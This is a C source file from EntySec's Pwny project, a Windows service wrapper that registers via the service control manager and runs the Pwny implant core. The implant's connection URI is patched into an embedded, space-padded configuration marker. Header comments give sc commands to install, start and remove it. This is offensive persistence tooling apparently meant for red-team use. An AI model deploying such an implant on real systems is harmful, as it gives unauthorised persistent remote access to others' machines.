/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Pwny Windows Service executable.
 *
 * This binary can be registered as a Windows service via CreateServiceA.
 * When started by the SCM, it properly responds to the service control
 * protocol while running the Pwny implant core in a worker thread.
 *
 * Connection URI is embedded in the binary at the CFGDATA_INIT marker,
 * same as the regular main.c executable.
 *
 * Usage:
 *   - Register as service:  sc create PwnySvc binPath= "C:\path\to\pwny_service.exe"
 *   - Start:                sc start PwnySvc
 *   - Stop/remove:          sc stop PwnySvc && sc delete PwnySvc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <winsock2.h>
#include <windows.h>
#include <ev.h>

#include <pwny/core.h>
#include <pwny/misc.h>
#include <pwny/log.h>

/* ---- Service globals ---- */

static SERVICE_STATUS g_ServiceStatus;
static SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
static HANDLE g_StopEvent = NULL;
static core_t *g_Core = NULL;

/* Service name — overridden by the embedded options marker.
 * SCM only cares about the service name used during registration,
 * but the dispatch table name should match. We use a generic name. */
#define SERVICE_NAME "PwnySvc"

/* ---- Options parsing (same as main.c) ---- */

static char g_options[] = "CFGDATA_INIT"
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  "
    "                                                  ";

static void parse_argv(int argc, char *argv[], core_t *core)
{
    int step;
    int index;
    char *short_options;
    struct option long_options[] = {
        {"uri", required_argument, NULL, 'u'},
        {"uuid", required_argument, NULL, 'U'},
        {NULL, 0, NULL, 0}
    };
    short_options = "u:U:";
    step = 0;
    index = 0;
    optind = 1;

    while ((step = getopt_long(argc, argv, short_options,
                               long_options, &index)) != -1)
    {
        switch (step)
        {
            case 'u':
                core_add_uri(core, optarg);
                break;
            case 'U':
                core_set_uuid(core, optarg);
                break;
            default:
                break;
        }
    }
}

static void parse_options(core_t *core)
{
    size_t argc;
    char **argv;

    argc = 0;
    argv = NULL;

    if (strncasecmp(g_options, "CFGDATA_INIT", strlen("CFGDATA_INIT")))
    {
        if ((argv = misc_argv_split(g_options, argv, &argc)))
        {
            parse_argv(argc, argv, core);
        }
    }
}

/* ---- Service worker thread ---- */

static DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
    (void)lpParam;

    g_Core = core_create();
    if (g_Core == NULL)
    {
        log_debug("* service: core_create failed\n");
        return 1;
    }

    core_setup(g_Core);
    parse_options(g_Core);

    /* Block here until core_stop is called or the connection dies */
    core_start(g_Core);

    core_destroy(g_Core);
    g_Core = NULL;

    return 0;
}

/* ---- Service control handler ---- */

static DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType,
                                          LPVOID lpEventData, LPVOID lpContext)
{
    (void)dwEventType;
    (void)lpEventData;
    (void)lpContext;

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            {
                break;
            }

            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceStatus.dwWin32ExitCode = 0;
            g_ServiceStatus.dwCheckPoint = 4;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

            /* Signal the stop event */
            SetEvent(g_StopEvent);
            break;

        case SERVICE_CONTROL_INTERROGATE:
            break;

        default:
            break;
    }

    return NO_ERROR;
}

/* ---- ServiceMain ---- */

static VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv)
{
    HANDLE hWorker;

    (void)argc;
    (void)argv;

    g_StatusHandle = RegisterServiceCtrlHandlerExA(
        SERVICE_NAME, ServiceCtrlHandlerEx, NULL);

    if (g_StatusHandle == NULL)
    {
        return;
    }

    memset(&g_ServiceStatus, 0, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_StopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_StopEvent == NULL)
    {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    /* Report running */
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    /* Start the implant in a worker thread */
    hWorker = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    /* Wait for stop signal */
    WaitForSingleObject(g_StopEvent, INFINITE);

    /* Gracefully stop the core if still running */
    if (g_Core != NULL && g_Core->loop != NULL)
    {
        ev_break(g_Core->loop, EVBREAK_ALL);
    }

    /* Give the worker thread a chance to finish */
    if (hWorker != NULL)
    {
        WaitForSingleObject(hWorker, 5000);
        CloseHandle(hWorker);
    }

    CloseHandle(g_StopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

/* ---- Entry point ---- */

int main(int argc, char *argv[])
{
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },
        { NULL, NULL }
    };

    (void)argc;
    (void)argv;

    /* StartServiceCtrlDispatcherA blocks until the service stops.
     * If called outside the SCM (e.g. from a console), it returns
     * an error and we fall through to run as a normal console app. */
    if (!StartServiceCtrlDispatcherA(ServiceTable))
    {
        DWORD err = GetLastError();

        if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
        {
            /* Running as a normal console process — useful for testing.
             * Just run the implant directly. */
            core_t *core = core_create();
            if (core == NULL)
            {
                return 1;
            }

            core_setup(core);
            parse_options(core);
            core_start(core);
            core_destroy(core);
        }
    }

    return 0;
}
